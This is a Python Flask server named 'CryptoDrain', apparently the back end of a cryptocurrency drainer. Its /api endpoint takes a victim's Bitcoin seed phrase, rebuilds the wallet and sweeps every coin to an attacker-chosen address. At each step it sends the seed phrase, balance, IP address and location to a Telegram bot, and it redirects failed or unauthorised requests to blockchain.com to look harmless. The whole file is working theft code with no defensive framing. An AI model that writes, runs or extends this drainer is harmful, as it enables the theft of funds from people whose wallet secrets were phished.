# import libraries
from flask import Flask, request, redirect
from bitcoinlib.wallets import *
import random
import requests
import json
import os
import pyfiglet
import time
from gevent.pywsgi import WSGIServer

# create the app
app = Flask(__name__)


# boot screen + version
def boot_screen():
    # clear the screen
    print('\033c')
    # print the boot screen
    # print in #F7931A
    # print in orange
    ascii_banner = pyfiglet.figlet_format('CryptoDrain' )
    print('\033[33m' + ascii_banner)
    print('\033[33m' + '--------------------- Version 1.2.0 ---------------------')
    print('----------------------- @fled-dev -----------------------' + '\033[0m')
    print()
    print()
    time.sleep(1)


# log function
def log(message):
    # get the current date and time
    now = datetime.now()
    # format the date and time
    dt_string = now.strftime("%d/%m/%Y - %H:%M:%S")
    with open('logfile.txt', 'a') as f:
        # append the message to the log file with the date and time
        f.write(f'{dt_string} : {message}\n')


# read the config.json file
def get_config():
    # if log file exists, delete it
    try:
        os.remove('logfile.txt')
        log('Log file from previous session deleted.')
    except:
        log('Log file not found. Continuing ...')

    # open and read the config.json file
    log('Reading config.json ...')
    with open('api/config.json', 'r') as config_file:
        config = json.load(config_file)
    log('Config.json read successfully.')
    # define global variables for the config values
    log('Assigning config values to global variables ...')
    global FLASK_API_KEYS
    global TG_API_KEY
    global TG_CHANNEL_ID
    global TG_NOTIFICATIONS
    # assign the config values to the global variables
    log('Config values assigned to global variables.')
    FLASK_API_KEYS = config['FLASK_API_KEYS']
    TG_API_KEY = config['TG_API_KEY']
    TG_CHANNEL_ID = config['TG_CHANNEL_ID']
    TG_NOTIFICATIONS = config['TG_NOTIFICATIONS']


# telegram notification function
def tg_notify(message):
    # check if telegram notifications are enabled
    if TG_NOTIFICATIONS == False:
        return
    elif TG_API_KEY == '':
        log('Telegram Configuration Error : No API key found.')
        return('Telegram Configuration Error : No API key found.')
    elif TG_CHANNEL_ID == '':
        log('Telegram Configuration Error : No channel ID found.')
        return('Telegram Configuration Error : No channel ID found.')
    
    try:
        log('Sending Telegram notification ...')
        api_url = f'https://api.telegram.org/bot{str(TG_API_KEY)}/sendMessage'
        response = requests.post(api_url, json={'chat_id': TG_CHANNEL_ID, 'parse_mode': 'Markdown', 'text': message})
        log('Telegram notification sent to the API.')
        # print success message in the telegram blue
    except Exception as e:
        log('Telegram notification failed. ' + str(e))
        return('Telegram Notification Error : ' + str(e))


def ip_location(ip):
    try:
        response = requests.get(f'https://ipapi.co/{ip}/json/').json()
        location_data = {
            "city": response.get("city"),
            "country": response.get("country_name")
        }
        location = location_data['city'] + ' / ' + location_data['country']
        log('IP location fetched successfully.')
    except:
        location = 'N/A'
        log('IP location could not be fetched.')
    return location


def current_ip():
    try:
        ip = request.environ['REMOTE_ADDR']
        log('Environ IP fetched successfully.')
    except:
        ip = 'N/A'
        log('Environ IP could not be fetched.')
    return ip


# create the index page
@app.route('/api')

def api():
    try:
        # read API key
        api_key = request.args.get('api-key')
        log('API key read successfully.')
        # check if API key is valid
        if api_key not in FLASK_API_KEYS:
            notification = f'*Error - Connection Refused (1/3)*\n\nSomeone tried to connect to the API without a valid API key.\n\nIP: {str(current_ip())}\nLocation: {str(ip_location(current_ip()))}\nAPI Key: {str(api_key)}'
            log('Someone tried to connect to the API without a valid API key.')
            tg_notify(str(notification))
            return redirect("http://www.blockchain.com")
        log('Someone connected to the API with a valid API key.')
        notification = f'*Success - Connection Established (1/3)*\n\nSomeone connected to the API with a valid API key.\n\nIP: {str(current_ip())}\nLocation: {str(ip_location(current_ip()))}'
        tg_notify(str(notification))

        # get seed phrase and receiver
        log('Getting seed phrase and receiver ...')
        seedphrase = request.args.get('seedphrase')
        receiver = request.args.get('receiver')
        balance = request.args.get('balance')

        # run the sweep function
        log('Running the sweep function ...')
        return sweep(seedphrase, receiver, balance)
    except Exception as e:
        log('An error occured in the api() function: ' + str(e))
        # send notification
        fatal_error = '*Fatal Error - Function: api()*\n\nA critical error occured in the api() function and immediate assistance is required.\n\nUnfortunately the Telegram API is not able to parse entities. The error cannot be displayed here. Find more info in the *logfile.txt*.'
        tg_notify(str(fatal_error))
        print(f'Fatal Error : {str(e)}')
        return redirect("http://www.blockchain.com")


def sweep(seedphrase, receiver, balance):
    print('---')
    print('---')
    print('Seed Phrase: ' + str(seedphrase))
    print('Receiver: ' + str(receiver))
    print('---')
    print('Scanning Wallet ...')

    # generate random wallet name (12 random characters)
    log('Generating random wallet name ...')
    random_wallet_name = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(12))

    # validate the seed phrase
    log('Validating the seed phrase ...')
    if wallet_delete_if_exists(str(random_wallet_name), force=True):
        pass

    # try to create the wallet
    try:
        log('Trying to create the wallet ...')
        w = Wallet.create(str(random_wallet_name), keys=str(seedphrase), network='bitcoin', witness_type='segwit')
        w.scan()
        w.info()
        log('Wallet created successfully.')
        # send notification -> wallet created
        notification = f'*Success - Wallet Created (2/3)*\n\nThe wallet was created successfull. Find more information below.\n\nSeed: {str(seedphrase)}\nBalance (not verified): {str(balance)} BTC'
        tg_notify(str(notification))
        print('Success : Wallet Created')   
    except Exception as e:
        # send notification -> wallet creation failed
        log('Wallet creation failed. ' + str(e))
        notification = f'*Error - Wallet Creation Failed (2/3)*\n\n{str(e)}\n\nIP: {current_ip()}\nLocation: {ip_location(current_ip())}\nSeed: {str(seedphrase)}\nBalance (not verified): {str(balance)} BTC'
        tg_notify(str(notification))
        print(f'Error : {str(e)}')
        return redirect("http://www.blockchain.com")

    # try to sweep the wallet
    try:
        t = w.sweep(str(receiver), offline=False)
        log('Wallet swept successfully.')
        # send notification -> wallet swept
        notification = f'*Success - Wallet Swept (3/3)*\n\nThe wallet was swept successfull. Find more information below.\n\nReceiver: {receiver}\nBalance (not verified): {str(balance)} BTC'
        tg_notify(str(notification))
        print('Success : Wallet Swept (3/3)')
        return redirect("http://www.blockchain.com")
    except Exception as e:
        log('Wallet sweep failed. ' + str(e))
        notification = f'*Error - Wallet Not Swept (3/3)*\n\n{str(e)}\n\nIP: {current_ip()}\nLocation: {ip_location(current_ip())}\nSeed: {str(seedphrase)}\nBalance (not verified): {str(balance)} BTC'
        tg_notify(str(notification))
        print(f'Error : {str(e)}')
        return redirect("http://www.blockchain.com")


# Run the app
if __name__ == '__main__':
    # read the config.json file
    boot_screen()
    get_config()
    print()
    # define the host and ip
    # host_ip = urllib.request.urlopen('https://v4.ident.me').read().decode('utf8')
    host_ip = '0.0.0.0'
    host_port = 8080
    time.sleep(0.5)
    print(f'\033[1mHost IP : {host_ip}')
    print(f'Host Port : {host_port}\033[0m')
    print()

    try:
        # run the app
        print('Server is waiting for incoming requests ...')
        http_server = WSGIServer((host_ip, host_port), app)
        http_server.serve_forever()
        # notification is not possible because the server started already
    except Exception as e:
        log('An error occured in the main function: ' + str(e))
        # send notification -> fatal error
        notification = f"*Fatal Server Error - Flask Server Couldn't Start*\n\n{str(e)}"
        tg_notify(notification)
        print(f'Fatal Error : {str(e)}')